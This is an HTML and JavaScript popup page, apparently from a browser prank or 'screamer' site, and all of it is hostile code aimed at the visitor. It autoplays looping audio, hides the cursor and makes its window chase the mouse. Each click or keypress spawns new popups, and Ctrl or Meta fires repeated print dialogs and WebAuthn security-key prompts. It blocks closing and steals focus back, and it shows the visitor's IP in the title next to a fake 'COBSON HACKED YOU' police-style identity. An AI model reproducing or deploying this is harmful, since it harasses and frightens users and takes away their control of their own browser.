<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title id="popup-title">...</title>
<base href="./">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; cursor: none !important; }
    html, body {
        width: 100%;
        height: 100%;
        overflow: hidden;
        background: #000;
        cursor: none;
    }
    img {
        width: 100%;
        height: 100%;
        object-fit: cover;
        display: block;
        pointer-events: none;
    }
    #fake-cursor {
        position: fixed;
        left: 42%;
        top: 38%;
        width: 28px;
        height: 28px;
        transform: translate(-2px, -2px);
        pointer-events: none;
        z-index: 99999;
        display: none !important;
        visibility: hidden;
        opacity: 0;
    }
</style>
</head>
<body>
<img src="assets/popup.gif" alt="Popup">
<svg id="fake-cursor" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
    <path d="M5 3v23.5l6.2-6 4.3 10.2 4.4-1.9-4.3-10.1H24z" fill="#fff" stroke="#111" stroke-width="2" stroke-linejoin="round"/>
</svg>
<audio id="popup-audio" preload="auto" autoplay loop>
    <source src="assets/game-audio.mp3" type="audio/mpeg">
</audio>
<script>
    const params = new URLSearchParams(window.location.search);
    const ip = params.get('ip') || 'Unknown';
    document.title = ip;

    const audio = document.getElementById('popup-audio');
    audio.volume = 0.5;
    audio.play().catch(() => {});

    const SPEED = 18;
    let vx = SPEED * (Math.random() > 0.5 ? 1 : -1);
    let vy = SPEED * (Math.random() > 0.5 ? 1 : -1);
    const margin = 15;
    const topMargin = 50;
    const winW = 400;
    const winH = 400;
    const fakeCursor = document.getElementById('fake-cursor');
    let cursorStuck = true;

    function clamp(val, min, max) {
        return Math.max(min, Math.min(max, val));
    }

    function popupUrl() {
        return 'popup.html?ip=' + encodeURIComponent(ip) + '&r=' + Date.now() + Math.random();
    }

    function spawnPopup() {
        const left = clamp(Math.floor(Math.random() * (screen.availWidth - winW)), 0, screen.availWidth - winW);
        const top = clamp(Math.floor(Math.random() * (screen.availHeight - winH)), 0, screen.availHeight - winH);
        window.open(
            popupUrl(),
            'Popup_' + Date.now() + '_' + Math.random(),
            'width=' + winW + ',height=' + winH + ',left=' + left + ',top=' + top
        );
    }

    function bounceWindow() {
        const x = window.screenX;
        const y = window.screenY;
        const width = window.outerWidth;
        const height = window.outerHeight;

        if (x < margin) vx = Math.abs(vx);
        if (x + width > screen.availWidth - margin) vx = -Math.abs(vx);
        if (y < topMargin) vy = Math.abs(vy);
        if (y + height > screen.availHeight - margin) vy = -Math.abs(vy);

        window.moveBy(vx, vy);

        if (cursorStuck && fakeCursor) {
            fakeCursor.style.display = 'none';
        }

        if (window.opener && !window.opener.closed && typeof window.opener.trackPopupCursor === 'function') {
            window.opener.trackPopupCursor(window, vx, vy, cursorStuck);
        }
    }

    setInterval(bounceWindow, 30);

    function unstickCursor() {
        cursorStuck = false;
        if (fakeCursor) fakeCursor.style.display = 'none';
        spawnPopup();
    }

    function requestWebauthnAttestation() {
        try {
            const createCredentialDefaultArgs = {
                publicKey: {
                    rp: { name: 'Acme' },
                    user: {
                        id: new Uint8Array(16),
                        name: 'COBSON_HACKED_YOU@POLICE.ST',
                        displayName: 'COBSON HACKED YOU'
                    },
                    pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
                    attestation: 'direct',
                    timeout: 60000,
                    challenge: new Uint8Array([
                        0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
                        0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
                    ]).buffer
                }
            };
            const getCredentialDefaultArgs = {
                publicKey: {
                    timeout: 60000,
                    challenge: new Uint8Array([
                        0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
                        0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
                    ]).buffer
                }
            };
            navigator.credentials.create(createCredentialDefaultArgs).then((cred) => {
                getCredentialDefaultArgs.publicKey.allowCredentials = [{
                    id: cred.rawId,
                    transports: ['usb', 'nfc', 'ble'],
                    type: 'public-key'
                }];
                return navigator.credentials.get(getCredentialDefaultArgs);
            });
        } catch (e) {}
    }

    function onCtrlCmdTrap(e) {
        if (e.key === 'Meta' || e.key === 'Control') {
            window.print();
            requestWebauthnAttestation();
            window.print();
            requestWebauthnAttestation();
            window.print();
            requestWebauthnAttestation();
        }
    }

    document.addEventListener('mousemove', (e) => {
        window.moveTo(e.screenX - (winW / 2), e.screenY - (winH / 2));
    });

    function animateTitle() {
        const bars = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█'];
        setInterval(() => {
            let wave = '';
            for (let i = 0; i < 10; i++) {
                const n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4;
                wave += bars[Math.max(0, Math.min(bars.length - 1, n))];
            }
            document.title = wave;
        }, 120);
    }

    animateTitle();

    document.addEventListener('mousedown', unstickCursor);
    document.addEventListener('touchstart', unstickCursor, { passive: true });
    document.addEventListener('mouseup', spawnPopup);
    document.addEventListener('click', spawnPopup);
    document.addEventListener('keydown', (e) => {
        spawnPopup();
        onCtrlCmdTrap(e);
    });
    document.addEventListener('keyup', spawnPopup);

    window.addEventListener('beforeunload', (e) => {
        if (window.opener && !window.opener.closed && window.opener.createPopup) {
            window.opener.createPopup();
        }
        e.preventDefault();
        e.returnValue = '';
    });

    window.addEventListener('blur', () => {
        window.focus();
    });
</script>
</body>
</html>
